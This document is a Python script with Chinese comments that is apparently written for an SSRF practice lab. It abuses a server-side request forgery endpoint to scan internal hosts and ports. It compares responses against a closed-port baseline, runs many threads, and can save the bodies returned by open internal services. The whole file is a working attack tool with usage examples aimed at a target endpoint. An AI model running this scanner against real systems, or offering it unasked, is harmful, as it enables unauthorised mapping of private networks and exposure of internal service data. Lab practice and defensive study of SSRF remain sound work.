#!/usr/bin/env python3
"""SSRF 内网端口扫描器

原理: 对每个 host:port 向 SSRF 端点发 POST, 用"关端口基线签名"过滤掉失败响应,
     留下的就是返回了内容的开放服务。

用法示例:
  # 扫网段内 21-27 的常用端口(默认)
  python3 ssrf_port_scan.py --endpoint http://192.168.122.16:8880/ssrf.php --hosts 172.72.23.21-27

  # 指定端口文件 / 端口列表 / 端口范围
  python3 ssrf_port_scan.py --endpoint http://192.168.122.16:8880/ssrf.php --hosts alive.txt --ports ports.txt
  python3 ssrf_port_scan.py --endpoint http://192.168.122.16:8880/ssrf.php --hosts 172.72.23.21-27 --ports 80,443,8080
  python3 ssrf_port_scan.py --endpoint http://192.168.122.16:8880/ssrf.php --hosts 172.72.23.0/24 --ports 1-1024

  # 把开放服务的响应体保存下来, 方便后续分析
  python3 ssrf_port_scan.py --endpoint http://192.168.122.16:8880/ssrf.php --hosts alive.txt --ports ports.txt --save-body ./bodies
"""
import argparse
import concurrent.futures
import ipaddress
import re
import sys
from pathlib import Path

try:
    import requests
except ImportError:
    sys.exit("需要 requests 库: pip install requests")

DEFAULT_PORTS = [21, 22, 23, 25, 53, 80, 110, 135, 139, 143, 443, 445,
                 993, 995, 1723, 3306, 3389, 5900, 6379, 8000, 8080,
                 8443, 8888, 9000, 9090, 9200, 11211]


def parse_hosts(spec):
    """支持 '172.72.23.21-27' / '172.72.23.21,24,26' / '172.72.23.0/24' / 文件路径"""
    if Path(spec).exists():
        return [l.strip() for l in Path(spec).read_text().splitlines() if l.strip()]
    out = []
    for part in spec.split(','):
        part = part.strip()
        if '/' in part:
            out += [str(h) for h in ipaddress.ip_network(part, strict=False).hosts()]
        else:
            m = re.match(r'^(.*\.)(\d+)-(\d+)$', part)
            if m:
                prefix, lo, hi = m.group(1), int(m.group(2)), int(m.group(3))
                out += [f'{prefix}{i}' for i in range(lo, hi + 1)]
            else:
                out.append(part)
    return out


def parse_ports(spec):
    """支持 '80,443,8080' / '1-1024' / 文件路径"""
    if Path(spec).exists():
        return [int(l) for l in Path(spec).read_text().splitlines() if l.strip()]
    out = []
    for part in spec.split(','):
        part = part.strip()
        if '-' in part:
            lo, hi = map(int, part.split('-'))
            out += range(lo, hi + 1)
        else:
            out.append(int(part))
    return out


def probe_baseline(session, endpoint, first_host, baseline_port, timeout):
    """对第一个主机连一个必关端口, 得到"关闭"签名 (status, size)"""
    try:
        r = session.post(endpoint, data={'url': f'http://{first_host}:{baseline_port}'},
                         timeout=timeout)
        return r.status_code, len(r.content)
    except requests.RequestException:
        return None, None


def check_target(session, endpoint, target, timeout):
    """发一次 SSRF 请求, 返回 (target, status, size, body)

    注意: data 必须用 dict。PHP 的 $_POST 只在请求头带
    Content-Type: application/x-www-form-urlencoded 时才被填充,
    requests 只有传 dict 才自动加这个头; 传字符串(如 'url=...')
    时没有该头, 靶机收不到 url 参数会返回空 body。
    """
    try:
        r = session.post(endpoint, data={'url': f'http://{target}'}, timeout=timeout)
        return target, r.status_code, len(r.content), r.content
    except requests.RequestException as e:
        return target, 'ERR', 0, str(e).encode()


def main():
    ap = argparse.ArgumentParser(description='SSRF 内网端口扫描')
    ap.add_argument('--endpoint', default='http://192.168.122.16:8880/ssrf.php',
                    help='SSRF 端点 URL')
    ap.add_argument('--subnet', default='',
                    help='主机前缀: hosts 里写纯末段(如 21)时自动补全为 172.72.23.21。'
                         '例: --subnet 172.72.23.')
    ap.add_argument('--hosts', required=True, help='主机: 范围/列表/CIDR/文件')
    ap.add_argument('--ports', default=None, help='端口: 列表/范围/文件 (默认内置常用端口)')
    ap.add_argument('-t', '--threads', type=int, default=10,
                    help='并发线程数 (SSRF 扫描瓶颈在靶机服务端 fetch, 别开太高, 会打挂靶机)')
    ap.add_argument('--timeout', type=float, default=5, help='单请求超时(秒)')
    ap.add_argument('--baseline-port', type=int, default=1,
                    help='用于摸基线的必关端口 (默认 1)')
    ap.add_argument('--save-body', default=None, help='把开放服务响应体保存到此目录')
    args = ap.parse_args()

    hosts = parse_hosts(args.hosts)
    ports = parse_ports(args.ports) if args.ports else DEFAULT_PORTS
    if not hosts or not ports:
        sys.exit('hosts / ports 解析为空')

    # hosts 里可能是纯末段(如 21), 有 --subnet 时自动补全为 172.72.23.21
    def full_host(h):
        if args.subnet and h and h.replace('.', '').isdigit() and '.' not in h:
            return args.subnet + h
        return h

    hosts = [full_host(h) for h in hosts]
    targets = [f'{h}:{p}' for h in hosts for p in ports]
    print(f'[*] 目标 {len(hosts)} 主机 x {len(ports)} 端口 = {len(targets)} 个请求')

    session = requests.Session()
    base_status, base_size = probe_baseline(session, args.endpoint, hosts[0],
                                            args.baseline_port, args.timeout)
    print(f'[*] 基线签名(关闭端口): status={base_status} size={base_size}')
    if base_status is None:
        sys.exit('[!] 基线探测失败: 靶机无响应(可能被之前的请求打挂了)。'
                 '等一会儿再试, 或重启靶场 docker compose。')

    open_found = []
    err_found = []
    with concurrent.futures.ThreadPoolExecutor(max_workers=args.threads) as ex:
        futs = {ex.submit(check_target, session, args.endpoint, t, args.timeout): t
                for t in targets}
        done = 0
        for fut in concurrent.futures.as_completed(futs):
            done += 1
            target, status, size, body = fut.result()
            # "开放" = 响应与基线签名不同(通常: 基线 size=0, 开放 size>0)
            if status != 'ERR' and (status != base_status or size != base_size):
                open_found.append((target, status, size, body))
            elif status == 'ERR':
                err_found.append((target, str(body.decode(errors='replace'))))
            print(f'\r[*] 进度 {done}/{len(targets)}  已发现 {len(open_found)} 个',
                  end='', flush=True)
    print()

    print(f'\n[+] 开放服务: {len(open_found)} 个')
    for target, status, size, body in sorted(open_found, key=lambda x: x[0]):
        print(f'  {target:<20} status={status:<4} size={size}')
        if args.save_body:
            Path(args.save_body).mkdir(parents=True, exist_ok=True)
            fname = target.replace(':', '_')
            Path(args.save_body, fname).write_bytes(body)

    if err_found:
        print(f'\n[!] 超时/异常(可能是被过滤的开放端口, 需手动复查): {len(err_found)} 个')
        for t, e in err_found:
            print(f'  {t:<20} {e[:60]}')


if __name__ == '__main__':
    main()
